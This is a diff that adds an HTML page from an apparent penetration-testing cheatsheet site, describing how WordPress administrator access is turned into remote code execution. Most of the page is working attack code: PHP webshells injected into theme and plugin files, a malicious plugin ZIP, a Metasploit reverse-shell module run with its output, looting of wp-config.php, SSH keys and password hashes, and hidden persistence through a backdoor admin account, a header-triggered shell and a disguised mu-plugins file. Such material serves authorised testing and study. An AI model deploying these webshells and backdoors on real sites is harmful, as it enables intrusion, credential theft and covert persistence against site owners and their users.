@@ -1,0 +1,345 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Admin to RCE · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › WordPress</nav><h1>Admin to RCE</h1><p class="cx-lede">Turning admin credentials into a webshell on the WordPress host - theme editor 404.php injection, plugin upload via ZIP, Metasploit&#x27;s wp_admin_shell_upload module, and the post-exploitation looting of wp-config.php for DB credentials and Auth keys.</p><div class="cx-tags"><span class="cx-tag">MITRE T1059, T1505.003, T1190, T1078</span><span class="cx-tag">D3FEND D3-AH</span><span class="cx-tag">IMPACT RCE, FileWrite, CredentialTheft</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Once you have administrator credentials, RCE is mechanical - WordPress's admin dashboard provides multiple paths to write PHP code that the server will execute. Three reliable methods, ranked by stealth and reliability:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. Theme Editor - modify an inactive theme&#x27;s 404.php
+#    Appearance → Theme Editor → select inactive theme → edit 404.php
+#    Add: &lt;?php system($_GET[&#x27;c&#x27;]); ?&gt;
+#    Trigger: curl &#x27;http://target/wp-content/themes/INACTIVE_THEME/404.php?c=id&#x27;
+
+# 2. Plugin Editor - modify any plugin file
+#    Plugins → Plugin Editor → select plugin → add system() call to main file
+
+# 3. Plugin upload as ZIP
+#    Plugins → Add New → Upload Plugin → upload a malicious plugin ZIP
+
+# Automated: Metasploit
+msf &gt; use exploit/unix/webapp/wp_admin_shell_upload
+msf &gt; set RHOSTS target.com
+msf &gt; set USERNAME admin
+msf &gt; set PASSWORD &lt;password&gt;
+msf &gt; set LHOST &lt;attacker&gt;
+msf &gt; run</code></pre></figure>
+<p>Success indicator: command output (<code>uid=33(www-data) ...</code>) in response to your shell-trigger request, or a Meterpreter session.</p>
+<h2 id="why-admin-rce">Why admin = RCE</h2>
+<p>WordPress's design assumption: the administrator role is fully trusted. The admin can modify any post, install any plugin or theme, edit PHP source code through the dashboard, and modify site options. From a security architecture perspective, "compromise of admin credentials" is equivalent to "compromise of the entire WordPress installation."</p>
+<p>This means the admin-to-RCE chain is intentionally built into the platform. You're not bypassing security; you're using the documented administrator features.</p>
+<p>Two implications:</p>
+<ol>
+<li>The chain works on <strong>every</strong> WordPress install regardless of version (modulo specific hardening - see below).</li>
+<li>Detection is impossible to disable entirely without breaking the admin experience.</li>
+</ol>
+<h2 id="method-1-theme-editor">Method 1 - Theme Editor</h2>
+<p>WordPress's admin dashboard includes a built-in PHP editor at <code>Appearance → Theme Editor</code> (URL: <code>/wp-admin/theme-editor.php</code>). It lets administrators edit theme PHP source code directly from the browser.</p>
+<h3 id="walkthrough">Walkthrough</h3>
+<ol>
+<li>Log into <code>/wp-admin/</code> with admin credentials.</li>
+<li>Navigate to <code>Appearance → Theme Editor</code>.</li>
+<li>The editor opens on the <strong>active</strong> theme by default. Switch to an <strong>inactive</strong> theme via the top-right "Select theme to edit" dropdown. Choose any inactive theme - <code>Twenty Twenty-Three</code>, <code>Twenty Twenty-Two</code>, etc.</li>
+</ol>
+<p>The reason for using an inactive theme: editing the <em>active</em> theme's <code>functions.php</code> can break the entire site (the broken PHP gets included on every page load). The active theme's <code>404.php</code> is somewhat safer (only fires on 404s) but still risky. Inactive themes' files are loaded only when you directly request them by URL - so editing them is contained.</p>
+<ol start="4">
+<li>
+<p>From the file list on the right, pick <code>404.php</code> (or any other template file that's reachable as a direct URL).</p>
+</li>
+<li>
+<p>Prepend a PHP webshell at the top:</p>
+</li>
+</ol>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php system($_GET[&#x27;c&#x27;]); ?&gt;
+
+&lt;?php
+/**
+ * Template for displaying 404 pages - original WP code below
+ ...</code></pre></figure>
+<ol start="6">
+<li>
+<p>Click <code>Update File</code>.</p>
+</li>
+<li>
+<p>Trigger the webshell:</p>
+</li>
+</ol>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">curl &#x27;http://target/wp-content/themes/twentytwentythree/404.php?c=id&#x27;</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre></figure>
+<p>The shell runs as the web server's user (<code>www-data</code> on Debian/Ubuntu Apache; <code>apache</code> on RHEL/CentOS; <code>nginx</code> on nginx).</p>
+<h3 id="caveats">Caveats</h3>
+<ul>
+<li>The theme editor is disabled when <code>DISALLOW_FILE_EDIT</code> is set in <code>wp-config.php</code>:</li>
+</ul>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">define( &#x27;DISALLOW_FILE_EDIT&#x27;, true );</code></pre></figure>
+<p>This is a common hardening recommendation. When set, the Theme Editor menu item disappears entirely. Move to Method 2 or 3.</p>
+<ul>
+<li>
+<p>Some security plugins (Wordfence, iThemes Security) intercept theme file modifications and roll them back automatically. Test on a target with these in place - modifications may stick for seconds before being reverted.</p>
+</li>
+<li>
+<p>The modification appears in WordPress's audit log if logging is configured.</p>
+</li>
+</ul>
+<h2 id="method-2-plugin-editor">Method 2 - Plugin Editor</h2>
+<p>Same concept as Theme Editor but for plugins. <code>Plugins → Plugin Editor</code> (URL: <code>/wp-admin/plugin-editor.php</code>).</p>
+<h3 id="walkthrough_1">Walkthrough</h3>
+<ol>
+<li>Log in. Navigate to <code>Plugins → Plugin Editor</code>.</li>
+<li>Select a plugin from the dropdown - preferably one that's small and won't be missed if you break it (<code>Hello Dolly</code> is bundled with every WordPress install and is famously the example plugin - also famously, it's a good target for this).</li>
+<li>Pick the main PHP file from the file list.</li>
+<li>Add a webshell:</li>
+</ol>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php
+if (isset($_GET[&#x27;c&#x27;])) {
+    system($_GET[&#x27;c&#x27;]);
+    die();
+}
+?&gt;
+
+&lt;?php
+/**
+ * Plugin Name: Hello Dolly
+ * ... (rest of original file)</code></pre></figure>
+<ol start="5">
+<li><code>Update File</code>.</li>
+<li>Trigger:</li>
+</ol>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">curl &#x27;http://target/wp-content/plugins/hello.php?c=id&#x27;</code></pre></figure>
+<p>Same caveats as Method 1 apply (DISALLOW_FILE_EDIT, security plugin rollback).</p>
+<h2 id="method-3-plugin-upload-as-zip">Method 3 - Plugin Upload as ZIP</h2>
+<p><code>Plugins → Add New → Upload Plugin</code> lets an admin upload a <code>.zip</code> containing a complete plugin. WordPress unpacks the ZIP into <code>wp-content/plugins/&lt;name&gt;/</code> and (if the plugin's main file has a proper header) makes it available for activation.</p>
+<h3 id="building-a-malicious-plugin">Building a malicious plugin</h3>
+<p>A minimal "plugin" is just a directory with a single PHP file that has the WordPress plugin header:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">mkdir pwn
+cat &gt; pwn/pwn.php &lt;&lt;&#x27;EOF&#x27;
+&lt;?php
+/*
+ * Plugin Name: pwn
+ * Description: pwn
+ * Version: 1.0
+ */
+if (isset($_GET[&#x27;c&#x27;])) {
+    system($_GET[&#x27;c&#x27;]);
+    die();
+}
+?&gt;
+EOF
+
+zip -r pwn.zip pwn/</code></pre></figure>
+<h3 id="walkthrough_2">Walkthrough</h3>
+<ol>
+<li>Log in. Navigate to <code>Plugins → Add New → Upload Plugin</code>.</li>
+<li>Choose <code>pwn.zip</code>. Click <code>Install Now</code>.</li>
+<li>WordPress unpacks the ZIP into <code>wp-content/plugins/pwn/</code>.</li>
+<li>The shell is immediately reachable at <code>/wp-content/plugins/pwn/pwn.php?c=id</code> - no activation required, since the file is web-accessible regardless of WordPress's "active" state.</li>
+</ol>
+<h3 id="why-this-works-when-theme-editor-doesnt">Why this works when Theme Editor doesn't</h3>
+<p><code>DISALLOW_FILE_EDIT</code> disables the theme/plugin editors but does <em>not</em> disable plugin upload. To disable upload, the admin needs:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">define( &#x27;DISALLOW_FILE_MODS&#x27;, true );   // disables both edit AND new install</code></pre></figure>
+<p>This is a stronger hardening setting. When set, Method 3 also fails, and the operator needs an alternative path (FTP/SFTP if credentials are also recovered; direct database manipulation; an actual plugin CVE).</p>
+<h2 id="method-4-metasploits-wp_admin_shell_upload">Method 4 - Metasploit's wp_admin_shell_upload</h2>
+<p>Metasploit automates Method 3 entirely:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">msfconsole
+msf &gt; use exploit/unix/webapp/wp_admin_shell_upload
+
+msf exploit(wp_admin_shell_upload) &gt; show options
+
+Name       Current Setting  Required  Description
+----       ---------------  --------  -----------
+PASSWORD                    yes       The WordPress password to authenticate with
+Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+RHOSTS                      yes       The target host(s)
+RPORT      80               yes       The target port (TCP)
+SSL        false            no        Negotiate SSL/TLS for outgoing connections
+TARGETURI  /                yes       The base path to the WordPress application
+USERNAME                    yes       The WordPress username to authenticate with
+VHOST                       no        HTTP server virtual host
+
+Payload options (php/meterpreter/reverse_tcp):
+LHOST                       yes       The listen address
+LPORT      4444             yes       The listen port
+
+msf &gt; set RHOSTS target.com
+msf &gt; set USERNAME admin
+msf &gt; set PASSWORD sunshine1
+msf &gt; set LHOST 10.10.16.8
+msf &gt; run</code></pre></figure>
+<p>What it does internally:</p>
+<ol>
+<li>Authenticates to <code>wp-login.php</code> with the provided creds.</li>
+<li>Creates a malicious plugin (random name) with a PHP Meterpreter payload.</li>
+<li>Uploads it via the plugin upload form (using the auth cookie from step 1).</li>
+<li>Triggers the payload by requesting the plugin file directly.</li>
+<li>Meterpreter connects back to <code>LHOST:LPORT</code>.</li>
+<li>Cleans up the uploaded plugin file (sometimes - depends on the version).</li>
+</ol>
+<p>Output:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>[*] Started reverse TCP handler on 10.10.16.8:4444
+[*] Authenticating with WordPress using admin:sunshine1...
+[+] Authenticated with WordPress
+[*] Uploading payload...
+[*] Executing the payload at /wp-content/plugins/YtyZGFIhax/uTvAAKrAdp.php...
+[*] Sending stage (38247 bytes) to target.com
+[*] Meterpreter session 1 opened (10.10.16.8:4444 -&gt; target.com:43210) at 2024-01-01 12:00:00 +0000
+[+] Deleted uTvAAKrAdp.php
+
+meterpreter &gt; getuid
+Server username: www-data (33)</code></pre></figure>
+<p>The module is reliable but very noisy:</p>
+<ul>
+<li>The temporary plugin name and the temporary PHP filename are random per session, but the pattern (random alphanumeric directories under <code>plugins/</code>) is recognizable to defenders.</li>
+<li>Meterpreter PHP stage uses well-known network patterns that EDR and IDS catch.</li>
+<li>The login attempt is via <code>wp-login.php</code> (not <code>xmlrpc.php</code>) - visible in WP audit logs.</li>
+</ul>
+<p>For stealth-required engagements, manual Method 1/2/3 with a small custom webshell is often preferable.</p>
+<h2 id="post-rce-looting">Post-RCE looting</h2>
+<p>Once you have a shell, the standard WordPress looting checklist:</p>
+<h3 id="wp-configphp-the-prize"><code>wp-config.php</code> - the prize</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ cat /var/www/html/wp-config.php | grep -E &#x27;^define|table_prefix&#x27;</code></pre></figure>
+<p>What you grab:</p>
+<ul>
+<li><strong>DB credentials</strong> (<code>DB_HOST</code>, <code>DB_USER</code>, <code>DB_PASSWORD</code>, <code>DB_NAME</code>) - for direct database access (<code>mysql -h ... -u ... -p</code>)</li>
+<li><strong>Auth keys and salts</strong> (<code>AUTH_KEY</code>, <code>SECURE_AUTH_KEY</code>, <code>LOGGED_IN_KEY</code>, etc.) - for forging WordPress auth cookies</li>
+<li><strong>Table prefix</strong> (<code>$table_prefix</code>) - needed for SQL injection payloads against this DB</li>
+</ul>
+<h3 id="database-extraction">Database extraction</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ mysql -h &lt;DB_HOST&gt; -u &lt;DB_USER&gt; -p&lt;DB_PASSWORD&gt; &lt;DB_NAME&gt;
+mysql&gt; SELECT ID, user_login, user_email, user_pass FROM wp_users;
+mysql&gt; SELECT user_id, meta_value FROM wp_usermeta WHERE meta_key = &#x27;wp_capabilities&#x27;;</code></pre></figure>
+<p>The <code>wp_capabilities</code> meta_value contains the user's role(s) as a serialized PHP array. Map user IDs to roles to see which accounts are admins.</p>
+<p>The <code>user_pass</code> column is phpass-hashed:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>$P$BFqBfvWtsHHGzVKVR2KvI6Js2gMQ4Q.</code></pre></figure>
+<p>Crack with hashcat mode 400 (WordPress phpass):</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">hashcat -m 400 wp_hashes.txt /usr/share/wordlists/rockyou.txt</code></pre></figure>
+<h3 id="sensitive-files-in-wp-content">Sensitive files in wp-content</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Backup plugins often dump SQL/ZIPs into uploads or a backup subdir
+find /var/www/html/wp-content -name &#x27;*.sql&#x27; -o -name &#x27;*.sql.gz&#x27; -o -name &#x27;*.zip&#x27; -o -name &#x27;*.bak&#x27;
+
+# Recent uploads - sometimes employees attach sensitive files
+ls -la /var/www/html/wp-content/uploads/$(date +%Y)/$(date +%m)/
+
+# Debug log if WP_DEBUG_LOG was enabled - contains paths and stack traces
+cat /var/www/html/wp-content/debug.log 2&gt;/dev/null
+
+# .htaccess sometimes contains HTTP Basic credentials
+cat /var/www/html/.htaccess
+cat /var/www/html/wp-admin/.htaccess 2&gt;/dev/null</code></pre></figure>
+<h3 id="host-level-recon">Host-level recon</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Linux user enumeration
+cat /etc/passwd
+
+# Look for SSH keys on the server
+find / -name &#x27;id_rsa&#x27; -readable 2&gt;/dev/null
+find / -name &#x27;authorized_keys&#x27; -readable 2&gt;/dev/null
+
+# Sometimes the webserver user has sudo
+sudo -l 2&gt;&amp;1
+
+# Other services running on the host
+netstat -tnlp 2&gt;/dev/null || ss -tnlp 2&gt;/dev/null</code></pre></figure>
+<h3 id="pivoting">Pivoting</h3>
+<p>The <code>DB_HOST</code> from <code>wp-config.php</code> is often not <code>localhost</code> - it can point to an internal database server. That's an internal-network host worth attacking:</p>
+<ul>
+<li>If <code>DB_HOST</code> = <code>db.internal:3306</code>, see the <a href="../../../network/services/mysql/index.html">MySQL service page</a> for what to do with database credentials on an internal target.</li>
+<li>Other internal hosts the WordPress server can reach (via its DB connection, via the API integrations the plugins use, via the WP-CRON external endpoints) - each is a target.</li>
+</ul>
+<h2 id="persistence">Persistence</h2>
+<p>If the engagement scope permits persistence:</p>
+<h3 id="backdoor-account-in-the-database">Backdoor account in the database</h3>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- See &quot;Direct admin user creation via SQL&quot; in login-bruteforce/
+INSERT INTO wp_users (user_login, user_pass, user_email, user_registered, display_name)
+VALUES (&#x27;support&#x27;, &#x27;$P$&lt;hash-of-PASS&gt;&#x27;, &#x27;s@s.com&#x27;, NOW(), &#x27;Support&#x27;);
+INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
+VALUES (LAST_INSERT_ID(), &#x27;wp_capabilities&#x27;, &#x27;a:1:{s:13:&quot;administrator&quot;;b:1;}&#x27;);</code></pre></figure>
+<p>Survives plugin uninstall, theme replacement, and WP core update. Doesn't survive a fresh install from backup that overwrites the DB.</p>
+<h3 id="webshell-hidden-in-a-plugins-existing-file">Webshell hidden in a plugin's existing file</h3>
+<p>Replacing an existing plugin file (instead of adding a new one) is less likely to be noticed:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Find a plugin file with low recent activity
+ls -la wp-content/plugins/akismet/akismet.php
+
+# Inject a webshell that triggers on a specific header or unusual parameter
+echo &#x27;&lt;?php if($_SERVER[&quot;HTTP_X_PWN&quot;]) { system($_SERVER[&quot;HTTP_X_PWN&quot;]); } ?&gt;&#x27; \
+  | cat - wp-content/plugins/akismet/akismet.php &gt; /tmp/new &amp;&amp; \
+  mv /tmp/new wp-content/plugins/akismet/akismet.php</code></pre></figure>
+<p>Triggered by sending a request with the header <code>X-Pwn: id</code>. Doesn't appear in URL paths; doesn't break the plugin's normal function.</p>
+<h3 id="mu-plugins-directory"><code>mu-plugins</code> directory</h3>
+<p>The <code>wp-content/mu-plugins/</code> directory ("must-use plugins") is loaded by WordPress automatically without needing activation. Drop a PHP file there:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">mkdir -p wp-content/mu-plugins
+cat &gt; wp-content/mu-plugins/cache.php &lt;&lt;&#x27;EOF&#x27;
+&lt;?php
+if (isset($_COOKIE[&#x27;wp-cache-key&#x27;]) &amp;&amp; $_COOKIE[&#x27;wp-cache-key&#x27;] === &#x27;YOUR-SECRET&#x27;) {
+    system($_GET[&#x27;c&#x27;]);
+    die();
+}
+EOF</code></pre></figure>
+<p><code>mu-plugins</code> doesn't appear in the admin "Plugins" page (intentionally - it's for hosting-provider plugins). Less visible to anyone reviewing the plugin list.</p>
+<h3 id="cleanup-notes">Cleanup notes</h3>
+<p>For pentest reports, document any persistence you added and remove it at the end of the engagement. Common cleanup:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">DELETE FROM wp_users WHERE user_login = &#x27;support&#x27;;
+DELETE FROM wp_usermeta WHERE user_id NOT IN (SELECT ID FROM wp_users);</code></pre></figure>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">rm /var/www/html/wp-content/mu-plugins/cache.php
+# restore plugin files from a known-clean backup</code></pre></figure>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Prereq</th>
+<th>Path</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Theme Editor</td>
+<td><code>DISALLOW_FILE_EDIT</code> not set</td>
+<td><code>/wp-admin/theme-editor.php</code> → edit 404.php in inactive theme</td>
+</tr>
+<tr>
+<td>Plugin Editor</td>
+<td><code>DISALLOW_FILE_EDIT</code> not set</td>
+<td><code>/wp-admin/plugin-editor.php</code> → edit plugin main file</td>
+</tr>
+<tr>
+<td>Plugin upload (manual)</td>
+<td><code>DISALLOW_FILE_MODS</code> not set</td>
+<td>Build ZIP, upload via <code>/wp-admin/plugin-install.php</code></td>
+</tr>
+<tr>
+<td>Plugin upload (auto)</td>
+<td>Same</td>
+<td><code>msf &gt; use exploit/unix/webapp/wp_admin_shell_upload</code></td>
+</tr>
+<tr>
+<td>Webshell trigger</td>
+<td>After file is written</td>
+<td><code>curl 'http://target/wp-content/&lt;path&gt;?c=COMMAND'</code></td>
+</tr>
+<tr>
+<td>Read wp-config.php</td>
+<td>Post-RCE</td>
+<td><code>cat /var/www/html/wp-config.php</code></td>
+</tr>
+<tr>
+<td>Dump WP users from DB</td>
+<td>DB credentials in hand</td>
+<td><code>SELECT user_login, user_pass FROM wp_users;</code></td>
+</tr>
+<tr>
+<td>Crack WP hash</td>
+<td>phpass hash from DB</td>
+<td><code>hashcat -m 400 hashes.txt wordlist.txt</code></td>
+</tr>
+<tr>
+<td>mu-plugins backdoor</td>
+<td>Filesystem write</td>
+<td>Drop PHP into <code>wp-content/mu-plugins/</code></td>
+</tr>
+<tr>
+<td>DB backdoor user</td>
+<td>DB write</td>
+<td><code>INSERT INTO wp_users + wp_usermeta</code></td>
+</tr>
+</tbody>
+</table></article><nav class="cx-pager"><a class="cx-prev" href="../vulnerable-plugins/index.html">Previous: Vulnerable Plugins</a><a class="cx-next" href="../wpscan/index.html">Next: WPScan Reference</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
